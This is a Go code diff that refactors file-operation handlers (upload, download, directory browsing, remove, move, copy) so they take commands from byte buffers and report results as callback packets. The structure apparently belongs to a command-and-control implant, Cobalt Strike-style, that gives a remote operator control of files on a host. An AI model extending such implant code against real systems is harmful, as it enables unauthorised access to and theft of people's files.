@@ -13,12 +13,18 @@ import (
 	"strings"
 )
 
-func Upload(filePath string, fileContent []byte) (int, error) {
+func Upload(b []byte) error {
+	filePathByte, fileContent, err := parseCommandUpload(b)
+	if err != nil {
+		return err
+	}
+	filePath := string(filePathByte)
+	//filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
 	// normalize path
 	filePath = strings.ReplaceAll(filePath, "\\", "/")
 	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
 	if err != nil {
-		return 0, err
+		return err
 	}
 	defer func(fp *os.File) {
 		err := fp.Close()
@@ -26,11 +32,13 @@ func Upload(filePath string, fileContent []byte) (int, error) {
 			return
 		}
 	}(fp)
-	offset, err := fp.Write(fileContent)
+	_, err = fp.Write(fileContent)
 	if err != nil {
-		return 0, err
+		return err
 	}
-	return offset, nil
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("upload success"))
+	packet.PushResult(finalPacket)
+	return nil
 }
 
 func ChangeCurrentDir(path []byte) error {
@@ -42,16 +50,18 @@ func ChangeCurrentDir(path []byte) error {
 	return nil
 }
 
-func GetCurrentDirectory() ([]byte, error) {
+func GetCurrentDirectory() error {
 	pwd, err := os.Getwd()
 	result, err := filepath.Abs(pwd)
 	if err != nil {
-		return nil, err
+		return err
 	}
-	return []byte(result), nil
+	finPacket := packet.MakePacket(CALLBACK_PWD, []byte(result))
+	packet.PushResult(finPacket)
+	return nil
 }
 
-func FileBrowse(b []byte) ([]byte, error) {
+func FileBrowse(b []byte) error {
 	buf := bytes.NewBuffer(b)
 	//resultStr := ""
 	pendingRequest := make([]byte, 4)
@@ -59,18 +69,18 @@ func FileBrowse(b []byte) ([]byte, error) {
 
 	_, err := buf.Read(pendingRequest)
 	if err != nil {
-		return nil, err
+		return err
 	}
 	_, err = buf.Read(dirPathLenBytes)
 	if err != nil {
-		return nil, err
+		return err
 	}
 
 	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
 	dirPathBytes := make([]byte, dirPathLen)
 	_, err = buf.Read(dirPathBytes)
 	if err != nil {
-		return nil, err
+		return err
 	}
 
 	// list files
@@ -96,14 +106,14 @@ func FileBrowse(b []byte) ([]byte, error) {
 	*/
 	fileInfo, err := os.Stat(dirPathStr)
 	if err != nil {
-		return nil, err
+		return err
 	}
 	modTime := fileInfo.ModTime()
 	currentDir := fileInfo.Name()
 
 	absCurrentDir, err := filepath.Abs(currentDir)
 	if err != nil {
-		return nil, err
+		return err
 	}
 	modTimeStr := modTime.Format("02/01/2006 15:04:05")
 	resultStr := ""
@@ -117,7 +127,7 @@ func FileBrowse(b []byte) ([]byte, error) {
 	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
 	files, err := ioutil.ReadDir(dirPathStr)
 	if err != nil {
-		return nil, err
+		return err
 	}
 	for _, file := range files {
 		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")
@@ -130,11 +140,16 @@ func FileBrowse(b []byte) ([]byte, error) {
 	}
 	//fmt.Println(resultStr)
 
-	return util.BytesCombine(pendingRequest, []byte(resultStr)), nil
-
+	dirResult := util.BytesCombine(pendingRequest, []byte(resultStr))
+	finalPacket := packet.MakePacket(CALLBACK_PENDING, dirResult)
+	packet.PushResult(finalPacket)
+	return nil
 }
 
-func Download(filePath string) error {
+// TODO make download async
+func Download(b []byte) error {
+	filePath := string(b)
+	filePath = strings.ReplaceAll(filePath, "\\", "/")
 	fileInfo, err := os.Stat(filePath)
 	if err != nil {
 		return err
@@ -181,20 +196,30 @@ func Remove(filePath string) error {
 	if err != nil {
 		return err
 	}
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte(fmt.Sprintf("remove %s success", filePath)))
+	packet.PushResult(finalPacket)
 	return nil
 }
 
-func MoveFile(src string, dst string) error {
+func MoveFile(b []byte) error {
+	srcB, dstB, err := parseCommandMove(b)
+	src := string(srcB)
+	dst := string(dstB)
 	src = strings.ReplaceAll(src, "\\", "/")
 	dst = strings.ReplaceAll(dst, "\\", "/")
-	err := os.Rename(src, dst)
+	err = os.Rename(src, dst)
 	if err != nil {
 		return err
 	}
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("move success"))
+	packet.PushResult(finalPacket)
 	return nil
 }
 
-func CopyFile(src string, dst string) error {
+func CopyFile(b []byte) error {
+	srcB, dstB, err := parseCommandCopy(b)
+	src := string(srcB)
+	dst := string(dstB)
 	src = strings.ReplaceAll(src, "\\", "/")
 	dst = strings.ReplaceAll(dst, "\\", "/")
 	srcFile, err := os.Open(src)
@@ -231,6 +256,8 @@ func CopyFile(src string, dst string) error {
 			return err
 		}
 	}
+	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("copy success"))
+	packet.PushResult(finalPacket)
 	return nil
 }
 
